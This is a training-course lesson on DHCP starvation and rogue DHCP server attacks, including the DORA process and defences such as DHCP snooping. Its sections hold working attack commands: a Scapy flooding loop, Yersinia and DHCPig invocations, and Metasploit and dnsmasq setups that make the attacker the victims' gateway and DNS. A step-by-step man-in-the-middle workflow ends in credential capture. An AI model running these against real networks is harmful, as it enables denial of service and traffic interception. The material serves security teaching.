# DHCP Attacks

## Unit 5 - Topic 3 | Man-in-the-Middle Attacks

---

## Overview

**DHCP attacks** exploit the Dynamic Host Configuration Protocol to provide malicious network configurations to clients. By acting as a rogue DHCP server or exhausting the legitimate server's IP pool, attackers can redirect traffic, deny service, or position themselves as a gateway for MitM.

---

## 1. DHCP Process (DORA)

```
NORMAL DHCP — DORA PROCESS:

CLIENT                          DHCP SERVER
  │                                 │
  │──── 1. DISCOVER (Broadcast) ──→│
  │     "I need an IP address"      │
  │                                 │
  │←─── 2. OFFER ─────────────────│
  │     "Here's 192.168.1.100"     │
  │                                 │
  │──── 3. REQUEST ──────────────→│
  │     "I'll take that IP"        │
  │                                 │
  │←─── 4. ACK ──────────────────│
  │     "Confirmed. Config:        │
  │      IP: 192.168.1.100         │
  │      Gateway: 192.168.1.1      │
  │      DNS: 8.8.8.8"            │
  │                                 │
```

---

## 2. DHCP Starvation Attack

```
DHCP STARVATION — Exhaust IP Pool:

Attacker sends hundreds of DISCOVER requests
with random MAC addresses:

ATTACKER → DHCP: DISCOVER (MAC: AA:11:22:33:44:01)
ATTACKER → DHCP: DISCOVER (MAC: AA:11:22:33:44:02)
ATTACKER → DHCP: DISCOVER (MAC: AA:11:22:33:44:03)
...
ATTACKER → DHCP: DISCOVER (MAC: AA:11:22:33:44:FF)

RESULT: All IPs in pool exhausted!
New legitimate clients CANNOT get an IP → DoS!

FOLLOW-UP: Deploy rogue DHCP server to serve
malicious configurations to starved clients.
```

```bash
# === DHCP STARVATION TOOLS ===
# Yersinia:
yersinia dhcp -attack 1 -interface eth0
# Attack 1: DHCP starvation

# DHCPig:
pig.py eth0
# Exhausts DHCP pool by requesting all IPs

# Scapy (Python):
from scapy.all import *
for i in range(256):
    mac = RandMAC()
    dhcp_discover = (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac) /
        DHCP(options=[("message-type","discover"),"end"])
    )
    sendp(dhcp_discover, iface="eth0")
```

---

## 3. Rogue DHCP Server Attack

```
ROGUE DHCP SERVER:

After DHCP starvation (or racing legitimate server):

┌──────────┐    DISCOVER    ┌──────────────┐
│  Victim  │ ──────────→    │  ROGUE DHCP  │  (Attacker)
│  Client  │ ←──────────    │   SERVER     │
└──────────┘    OFFER       └──────────────┘
                Config:
                IP: 10.0.0.100
                Gateway: 10.0.0.1  ← ATTACKER!
                DNS: 10.0.0.1     ← ATTACKER!

Victim now routes ALL traffic through attacker!

┌──────────┐         ┌──────────┐         ┌──────────┐
│  Victim  │ ──1──→  │ ATTACKER │ ──2──→  │ Real GW  │
│          │ ←─4──  │ (Gateway)│ ←─3──  │          │
└──────────┘         └──────────┘         └──────────┘
```

```bash
# === ROGUE DHCP SERVER ===
# Using Metasploit:
use auxiliary/server/dhcp
set SRVHOST 10.0.0.1
set NETMASK 255.255.255.0
set ROUTER 10.0.0.1        # Attacker as gateway
set DNSSERVER 10.0.0.1     # Attacker as DNS
set DHCPIPSTART 10.0.0.100
set DHCPIPEND 10.0.0.200
run

# Using dnsmasq:
dnsmasq --interface=eth0 \
  --dhcp-range=10.0.0.100,10.0.0.200,12h \
  --dhcp-option=3,10.0.0.1 \
  --dhcp-option=6,10.0.0.1

# Using Bettercap:
set dhcp6.spoof.domains target.com
dhcp6.spoof on
```

---

## 4. DHCP Attack Workflow

```
COMPLETE DHCP MitM ATTACK:

1. STARVE LEGITIMATE DHCP
   └── yersinia dhcp -attack 1

2. ENABLE IP FORWARDING
   └── echo 1 > /proc/sys/net/ipv4/ip_forward

3. START ROGUE DHCP
   └── dnsmasq with attacker as gateway + DNS

4. CONFIGURE NAT (to route traffic to internet)
   └── iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

5. START SNIFFING
   └── tcpdump / Wireshark / bettercap

6. CAPTURE CREDENTIALS
   └── From HTTP, FTP, unencrypted protocols
```

---

## 5. Detection and Prevention

| Defense | Description |
|---------|-------------|
| **DHCP Snooping** | Switch feature — only trusted ports serve DHCP |
| **Port Security** | Limit MACs per port (prevents starvation) |
| **802.1X** | Authenticate devices before network access |
| **Rate limiting** | Limit DHCP requests per port |
| **Monitoring** | Alert on multiple DHCP servers |
| **Static IP** | Critical servers use static addressing |
| **IP Source Guard** | Validates IP-to-MAC bindings |

```
DHCP SNOOPING (Switch Config):

Switch(config)# ip dhcp snooping
Switch(config)# ip dhcp snooping vlan 10
Switch(config-if)# ip dhcp snooping trust     ← Trusted DHCP port
Switch(config-if)# ip dhcp snooping limit rate 10  ← Rate limit
```

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **DHCP starvation** | Exhaust IP pool → DoS |
| **Rogue DHCP** | Serve malicious gateway/DNS |
| **MitM via DHCP** | Attacker becomes default gateway |
| **Yersinia** | DHCP starvation tool |
| **dnsmasq** | Lightweight rogue DHCP server |
| **Defense** | DHCP snooping + port security |

---

## Quick Revision Questions

1. **What are the four steps of DHCP (DORA)?**
2. **How does DHCP starvation enable a rogue DHCP attack?**
3. **What malicious configurations does a rogue DHCP server provide?**
4. **What is DHCP snooping and how does it prevent attacks?**
5. **Why is port security important against DHCP starvation?**

---

[← Previous: DNS Spoofing](02-dns-spoofing.md) | [Next: LLMNR/NBT-NS Poisoning →](04-llmnr-nbt-ns-poisoning.md)

---

*Unit 5 - Topic 3 of 6 | [Back to README](../README.md)*
